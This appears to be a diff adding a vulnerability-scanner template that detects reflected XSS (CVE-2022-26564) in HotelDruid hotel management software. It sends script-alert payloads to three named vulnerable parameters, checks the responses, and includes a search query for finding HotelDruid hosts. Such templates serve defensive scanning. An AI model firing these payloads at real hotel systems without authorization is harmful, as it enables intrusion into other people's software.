@@ -1,0 +1,30 @@
+name: HotelDruid Hotel Management Software v3.0.3 XSS CVE-2022-26564
+manual: true
+query: title="HotelDruid" || body="HotelDruid"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27XSS%27)</script>
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"XSS")
+  r1:
+    request:
+      method: GET
+      path: /modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27XSS%27)</script>&idclienti=1
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"XSS")
+  r2:
+    request:
+      method: GET
+      path: /dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script>
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"XSS")
+expression: r0() || r1() || r2()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-26564
+  description: Hoteldruid is an open source program for hotel management (property
+    management software) developed by DigitalDruid.Net.
+  tags: xss
